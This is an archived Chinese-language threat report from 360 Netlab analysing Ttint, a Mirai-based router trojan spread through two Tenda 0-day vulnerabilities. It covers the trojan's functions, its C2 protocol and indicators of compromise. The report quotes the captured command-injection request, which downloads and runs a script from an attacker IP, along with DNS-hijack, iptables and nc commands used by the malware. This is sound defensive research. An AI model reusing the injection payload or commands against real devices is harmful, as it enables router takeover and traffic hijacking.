{
    "id": "5ebcd4d2-dbd7-45e7-9a20-cc382014f8ac",
    "created_at": "2023-06-05T02:08:00.407743Z",
    "updated_at": "2025-03-27T02:16:59.32209Z",
    "deleted_at": null,
    "sha1_hash": "24c2152eb5111272de8ee78472473fedd89c2353",
    "title": "2020-09-30 - Ttint- An IoT remote control Trojan spreading through two 0-day vulnerabilities",
    "authors": "",
    "file_creation_date": "2023-06-04T12:45:58Z",
    "file_modification_date": "2023-06-04T12:45:58Z",
    "file_size": 1016344,
    "plain_text": "# Ttint: 一款通过2个0-day漏洞传播的IoT远控木马\n\n**[blog.netlab.360.com/ttint-an-iot-rat-uses-two-0-days-to-spread/](https://blog.netlab.360.com/ttint-an-iot-rat-uses-two-0-days-to-spread/)**\n\nAlex.Turing September 30, 2020\n\n### 本文作者：涂凌鸣，马延龙，叶根深\n\n## 背景介绍\n\n### 从2019年11月开始，360Netlab未知威胁检测系统Anglerfish蜜罐节点相继监测到某个攻击者 使用2个腾达路由器0-day漏洞传播一个基于Mirai代码开发的远程控制木马（RAT）。\n\n 常规的Mirai变种基本都是围绕DDoS做文章，而这个变种不同，在DDoS攻击之外，它针对路 由器设备实现了Socket5代理，篡改路由器DNS，设置iptables，执行自定义系统命令等多达 12个远程控制功能。\n\n 此外，在C2通信层面，它使用WSS (WebSocket over TLS) 协议，一方面这样在流量层面可 以规避非常成熟的Mirai流量检测，另一方面可以为C2提供安全加密通信。\n\n 在C2本身，攻击者最开始使用了一个Google的云服务IP，其后切换到位于香港的一台托管主 机，但是当我们使用网站证书，样本，域名及IP在我们的DNSmon系统里深入扩展关联后，我 们看到更多的基础设施IP，更多的样本，和更多的C2域名。\n\n 两个0 day，网关设备的12种远控功能，加密流量协议，多次更换的基础设施IP，我们怀疑这 个也许不是普通玩家。\n\n 这个僵尸网络我们将它命名为Ttint。\n\n## 0-day漏洞攻击\n\n### 2019年11月9号，我们监测到攻击者使用第一个Tenda路由器0-day漏洞（CVE-2018-14558 & CVE-2020-10987），传播Ttint样本。值得注意的是，这个漏洞直到2020年7月10号才被披露 出来[1]。\n```\nGET /goform/setUsbUnload/.js?\ndeviceName=A;cd%20/tmp%3Brm%20get.sh%3Bwget%20http%3A//34.92.139.186%3A5001/bot/get.s\nh%3Bchmod%20777%20get.sh%3B./get.sh HTTP/1.1\n\nHost: {target}\n\nConnection: keep-alive\n\nAccept-Encoding: gzip, deflate\n\nAccept: */*\n\nUser-Agent: python-requests/2.22.0\n\n 2020年8月21号，我们监测到攻击者使用第二个Tenda路由器0-day漏洞，传播Ttint样本。\n\n```\n\n-----\n\n### 2020年8月28号，我们通过邮件向路由器厂商Tenda报告了第二个0-day漏洞详情以及在野 PoC，尚未得到厂商回复。\n\n## 0-day漏洞影响范围\n\n### 360 FirmwareTotal系统通过对Tenda路由器固件分析和漏洞验证，发现以下Tenda路由器固件 受影响。\n```\nUS_AC9V1.0BR_V15.03.05.14_multi_TD01\n\nUS_AC9V1.0BR_V15.03.05.16_multi_TRU01\n\nUS_AC9V1.0BR_V15.03.2.10_multi_TD01\n\nUS_AC9V1.0BR_V15.03.2.13_multi_TD01\n\nUS_AC9V1.0BR_V15.03.2.13_multi_TDE01\n\nUS_AC9V3.0RTL_V15.03.06.42_multi_TD01\n\nUS_AC10UV1.0RTL_V15.03.06.48_multi_TDE01\n\nUS_AC15V1.0BR_V15.03.05.18_multi_TD01\n\nUS_AC15V1.0BR_V15.03.05.19_multi_TD01\n\nUS_AC15V1.0BR_V15.03.1.8_EN_TDEUS\n\nUS_AC15V1.0BR_V15.03.1.10_EN_TDC+TDEUS\n\nUS_AC15V1.0BR_V15.03.1.10_EN_TDCTDEUS\n\nUS_AC15V1.0BR_V15.03.1.12_multi_TD01\n\nUS_AC15V1.0BR_V15.03.1.16_multi_TD01\n\nUS_AC15V1.0BR_V15.03.1.17_multi_TD01\n\nUS_AC18V1.0BR_V15.03.05.05_multi_TD01\n\nUS_AC18V1.0BR_V15.03.3.6_multi_TD01\n\nUS_AC18V1.0BR_V15.03.3.10_multi_TD01\n\nac9_kf_V15.03.05.19(6318_)_cn\n\nac18_kf_V15.03.05.19(6318_)_cn\n\n 360 Quake网络空间测绘系统通过对全网资产测绘，发现Tenda路由器0-day具体分布如下图所 示。\n\n## Ttint概览\n\n### Ttint是一款基于Mirai代码开发的，针对路由器设备的远程控制木马。它除了复用10个 Mirai DDoS攻击指令以外，还实现了12个控制指令。\n\n```\n\n-----\n\n### 我们分析对比了2个时期的Ttint样本，发现它们的C2指令是完全相同的，但它们在所使用的0- day漏洞，XOR Key，C2协议上有一些区别。\n\n## 逆向分析\n\n### 总体来说，Ttint的主机行为比较简单，运行时，删除自身文件，操纵watchdog，防止设备重 启；通过绑定端口实现单一实例；接着把修改进程名以迷惑用户；最后和解密得到的C2建立 连接，上报设备信息，等待C2下发指令，执行对应的攻击或自定义功能。\n\n 我们可以看出它保留了mirai大量特征，诸如单一实例，随机进程名，敏感配制信息加密，集成 大量攻击向量等；同时创新地重写了网络通信部分，采用websocket协议，在流量层面规避非 常成熟的Mirai流量检测。Mirai已经是社区非常熟悉的老朋友了，因此本文不再赘述Ttint中类 似的功能，下文将Ttint V2的X86架构版本为例，从自定义的功能出发，剖析其具体实现。\n\n Ttint v2 样本分析\n\n MD5:73ffd45ab46415b41831faee138f306e\n ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, stripped\n Lib:uclib\n\n\n-----\n\n### Socket5代理\n\n 绑定C2下发的特定端口，开启Socket5代理服务。这可以让攻击者远程访问路由器内网，然后 实现内网漫游。\n\n 篡改路由器DNS\n\n 通过修改resolv.conf文件来篡改路由器DNS,\n```\necho nameserver \"DNS server\" > /etc/etc/resolv.conf\n\n 这种篡改的结果就是Ttint的作者可以劫持受影响路由设备下用户的任意网络访问，窃取敏感信 息。\n\n 设置iptables\n\n 通过设置iptables，实现流量转发，目标地址转化功能，下面的模式是将内网的服务暴露到公 网上。\niptables -t nat -A PREROUTING -d \"\" -p tcp --dport \"\" -j DNAT --to-destination \"\"\n\niptables -t nat -A POSTROUTING -d \"\" -p tcp --dport \"\" -j SNAT \"\"\n\niptables -A FORWARD -d -j ACCEPT\n\n 反向shell\n\n 通过socket实现反向shell，Ttint的作者可以像使用本地shell一样操作受影响路由设备的shell。\n\n 自升级\n\n```\n\n-----\n\n### 从指定的的Download URL（默认为uhyg8v.notepod2.com:5001）下载相应CPU架构的Bot程 序，实现自升级。\n\n 自退出\n\n Ttint通过绑定57322端口实现单一实例，因此杀死使用这个端口的进程，就能实现自退出，达 成清理现场的目的。\n\n 隐秘的网络通道\n\n 通过nc工具监听C2下发的特定端口实现，其中-d的参数的含义是\"Detach from stdin\",因此我们 推测PORT之后存在着重定向的相关指令，可以实现Ttint作者和受影响路由设备之间的数据传 输。\n```\nnc -d -l \"PORT\" \"some redirect cmd\"\n\n 上报设备信息\n\n 将设备的time，os，cpu，ip，version，mac信息上报给C2，不过在样本中的格式化字串\ntype=back_infoatk_id=%s&time=&os=中出现了一个Bug，遗漏了一个\"&\"字符。\n\n 执行系统命令\n\n```\n\n-----\n\n### 通过popen函数，执行C2下发的自定义系统命令\n\n## C2协议分析\n\n### Ttint Bot样本的C2信息按照Mirai形式加密存储在配置信息表中，XOR Key为0x0EDFCEBDA\n```\nc2 ciphertxt:\n\n51 19 55 56 56 45 59 50 49 62 0E 4E 4F 54 45 50 4F 44 12 0E 43 4F 4D 20\n\nc2 plaintxt:\n\nq9uvveypiB.notepod2.com\n\n 当Bot运行时，解密得到C2地址ws:q9uvveypiB.notepod2.com:443，然后通过WebSocket over TLS协议和C2进行安全通信。\n\n```\nWebSocket协议\n\n\n-----\n\n### 当Ttint C2回复Bot的响应码为101时，说明协议握手完成，然后Bot可以使用WebSocket协议 进行通信。以下是经过TLS解密后的WebSocket数据包示例。\n\nBot的上线包\n\n### 按照WebSocket协议，我们可以知道Payload长度为0x81, mask为0xD5F39E67，Payload Data数据地址为0x08~0x88。\n```\n00000000: 81 FE 00 81 D5 F3 9E 67 A1 8A EE 02 E8 91 FF 04 .......g........\n\n00000010: BE AC F7 09 B3 9C B8 06 A1 98 C1 0E B1 CE AE 41 ...............A\n\n00000020: A1 9A F3 02 E8 D5 F1 14 E8 BF F7 09 A0 8B BE 53 ...............S\n\n00000030: FB C2 AB 49 E5 DE AA 55 F8 94 FB 09 B0 81 F7 04 ...I...U........\n\n00000040: F3 90 EE 12 E8 9A A8 5F E3 D5 F7 17 E8 C2 A7 55 ......._.......U\n\n00000050: FB C2 A8 5F FB C1 AC 55 FB C2 AC 5F F3 85 FB 15 ..._...U..._....\n\n00000060: A6 9A F1 09 E8 C6 FD 02 E5 91 A9 04 E7 D5 FF 15 ................\n\n00000070: B2 80 A3 41 B8 92 FD 5A E5 C3 A4 57 B6 C9 AC 5E ...A...Z...W...^\n\n00000080: EF C4 F8 5D E7 C7 A4 5E E7     \n\n 把Payload Data同mask进行XOR计算，就得到了明文的Payload，这正是Bot的上线包。\n00000000 74 79 70 65 3d 62 61 63 6b 5f 69 6e 66 6f 26 61 |type=back_info&a|\n\n00000010 74 6b 5f 69 64 3d 30 26 74 69 6d 65 3d 26 6f 73 |tk_id=0&time=&os|\n\n00000020 3d 4c 69 6e 75 78 20 34 2e 31 35 2e 30 2d 34 32 |=Linux 4.15.0-42|\n\n00000030 2d 67 65 6e 65 72 69 63 26 63 70 75 3d 69 36 38 |-generic&cpu=i68|\n\n00000040 36 26 69 70 3d 31 39 32 2e 31 36 38 2e 32 32 32 |6&ip=192.168.222|\n\n00000050 2e 31 32 38 26 76 65 72 73 69 6f 6e 3d 35 63 65 |.128&version=5ce|\n\n00000060 30 62 37 63 32 26 61 72 67 73 3d 26 6d 61 63 3d |0b7c2&args=&mac=|\n\n00000070 30 30 3a 30 63 3a 32 39 3a 37 66 3a 32 34 3a 39 |00:0c:29:7f:24:9|\n\n00000080 32   \n\n\n```\nC2 指令\n\n### Ttint Bot支持22种C2指令，其中复用了Mirai的10种DDoS指令，自己实现了12种C2指令。\n\n 指令码 功能\n\n 0 attack_udp_generic\n\n 1 attack_udp_vse\n\n\n-----\n\n### 指令码 功能\n\n 2 attack_udp_dns\n\n 9 attack_udp_plain\n\n 3 attack_tcp_flag\n\n 4 attack_tcp_pack\n\n 5 attack_tcp_xmas\n\n 6 attack_grep_ip\n\n 7 attack_grep_eth\n\n 10 attack_app_http\n\n 12 运行nc程序\n\n 13 运行ls程序\n\n 15 执行自定义系统命令\n\n 16 篡改路由器DNS\n\n 18 获取设备信息\n\n 14 设置iptables\n\n 11 运行ifconfig命令\n\n 17 结束自身进程\n\n 19 开启socks5代理\n\n 20 关闭socks5代理\n\n 21 自升级\n\n 22 开启反向shell\n\nC2 指令格式分析\n\n### 我们监控到C2向Bot发送了以下指令\n\n\n-----\n\n```\n00000000: 00 55 00 00 00 0A 0F 01 00 00 00 00 20 02 1A 13 .U.......... ...\n\n00000010: 70 70 2D 6C 4F 76 32 78 39 6E 31 33 58 73 5A 30 pp-lOv2x9n13XsZ0\n\n00000020: 77 76 44 1B 30 69 70 74 61 62 6C 65 73 20 2D 44 wvD.0iptables -D\n\n00000030: 20 49 4E 50 55 54 20 2D 70 20 74 63 70 20 2D 2D  INPUT -p tcp -\n00000040: 64 70 6F 72 74 20 35 32 36 38 35 20 2D 6A 20 41 dport 52685 -j A\n\n00000050: 43 43 45 50 54                  CCEPT\n\n### 以下是C2指令格式解析\n00 55  ----  msg length\n\n0F ---- cmd id, here is \"run system cmd\"\n\n02 ----  option number\n\n1A ---- option type, here is \"attack id\"\n\n13 ---- option length, length of \"pp-lOv2x9n13XsZ0wvD\" = 0x13\n\n1B ---- option type, here is \"attack cmd buf\"\n\n30 ---- option length\n\n 一般来说Ttint会通过多个自定义的功能组合在一起实现具体的攻击目的。\n\n 以我们在实际中捕获的2条相邻指令为例，按照上文的C2指令格式可知，下面的指令是要执行 系统命令，具体的系统命令为\niptables -I INPUT -p tcp --dport 51599 -j ACCEPT,即允许访问受影响设备的51599端\n\n 口。\n00000000: 82 55 00 55 00 00 00 0A 0F 01 00 00 00 00 20 02 .U.U.......... .\n\n00000010: 1A 13 70 70 2D 51 77 76 73 59 59 45 45 4D 70 36 ..pp-QwvsYYEEMp6\n\n00000020: 77 49 31 62 43 1B 30 69 70 74 61 62 6C 65 73 20 wI1bC.0iptables\n\n00000030: 2D 49 20 49 4E 50 55 54 20 2D 70 20 74 63 70 20 -I INPUT -p tcp\n\n00000040: 2D 2D 64 70 6F 72 74 20 35 31 35 39 39 20 2D 6A --dport 51599 -j\n\n00000050: 20 41 43 43 45 50 54                ACCEPT\n\n 下面的指令，是要在要受影响设备的51599端口上开启Socket5代理功能。\n00000000: 82 3C 00 3C 00 00 00 0A 13 01 00 00 00 00 20 04 .<.<.......... .\n\n00000010: 1C 05 35 31 35 39 39 1D 06 61 6D 68 78 65 66 1E ..51599..amhxef.\n\n00000020: 08 64 40 61 59 79 31 39 52 1A 13 70 70 2D 30 58 .d@aYy19R..pp-0X\n\n00000030: 74 79 73 61 33 79 58 4D 51 59 6E 6C 41 72    tysa3yXMQYnlAr\n\n 俩个功能的组合，保证了Socket5代理的正常使用。\n\n## 处置建议\n\n### 我们建议Tenda路由器用户及时检查并更新固件系统。\n 我们建议读者对相关IP和URL进行监控和封锁。\n\n## 联系我们\n\n### 感兴趣的读者，可以在 twitter 或者通过邮件netlab[at]360.cn联系我们。\n\n## IoC\n\n```\n\n-----\n\n### IP:\n```\n34.92.85.21      Hong Kong       ASN15169       GOOGLE\n\n34.92.139.186     Hong Kong       ASN15169       GOOGLE    \n\n43.249.29.56     Hong Kong       ASN133115       HK Kwaifong\nGroup Limited\n\n45.249.92.60     Hong Kong       ASN133115       HK Kwaifong\nGroup Limited\n\n45.249.92.72     Hong Kong        ASN133115       HK Kwaifong\nGroup Limited\n\n103.60.220.48     Hong Kong       ASN133115       HK Kwaifong\nGroup Limited\n\n103.108.142.92    Hong Kong       ASN133115       HK Kwaifong\nGroup Limited\n\n103.243.183.248    Hong Kong       ASN133115       HK Kwaifong\nGroup Limited\n\n C2:\ncnc.notepod2.com:23231\n\nback.notepod2.com:80\n\nq9uvveypiB.notepod2.com:443\n\n Update Server:\nuhyg8v.notepod2.com:5001\n\n URL:\nhttp://45.112.205.60/td.sh\n\nhttp://45.112.205.60/ttint.i686\n\nhttp://45.112.205.60/ttint.arm5el\n\nhttp://45.112.205.60/ttint.mipsel\n\nhttp://34.92.139.186:5001/bot/get.sh\n\nhttp://34.92.139.186:5001/bot/ttint.mipsel\n\nhttp://34.92.139.186:5001/bot/ttint.x86_64\n\n MD5:\n3e6a16bcf7a9e9e0be25ae28551150f5\n\n4ee942a0153ed74eb9a98f7ad321ec97\n\n6bff8b6fd606e795385b84437d1e1e0a\n\n733f71eb6cfca905e8904d0fb785fb43\n\na89cefdf71f2fced35fba8612ad07174\n\nc5cb2b438ba6d809f1f71c776376d293\n\ncfc0f745941ce1ec024cb86b1fd244f3\n\n73ffd45ab46415b41831faee138f306e\n\n```\n\n-----",
    "language": "ZH",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-09-30 - Ttint- An IoT remote control Trojan spreading through two 0-day vulnerabilities.pdf"
    ],
    "report_names": [
        "2020-09-30 - Ttint- An IoT remote control Trojan spreading through two 0-day vulnerabilities.pdf"
    ],
    "threat_actors": [
        {
            "id": "f9806b99-e392-46f1-9c13-885e376b239f",
            "created_at": "2023-01-06T13:46:39.431871Z",
            "updated_at": "2025-03-27T02:00:03.08926Z",
            "deleted_at": null,
            "main_name": "Watchdog",
            "aliases": [
                "Thief Libra"
            ],
            "source_name": "MISPGALAXY:Watchdog",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1685930880,
    "ts_updated_at": 1743041819,
    "ts_creation_date": 1685882758,
    "ts_modification_date": 1685882758,
    "files": {
        "pdf": "https://archive.orkl.eu/24c2152eb5111272de8ee78472473fedd89c2353.pdf",
        "text": "https://archive.orkl.eu/24c2152eb5111272de8ee78472473fedd89c2353.txt",
        "img": "https://archive.orkl.eu/24c2152eb5111272de8ee78472473fedd89c2353.jpg"
    }
}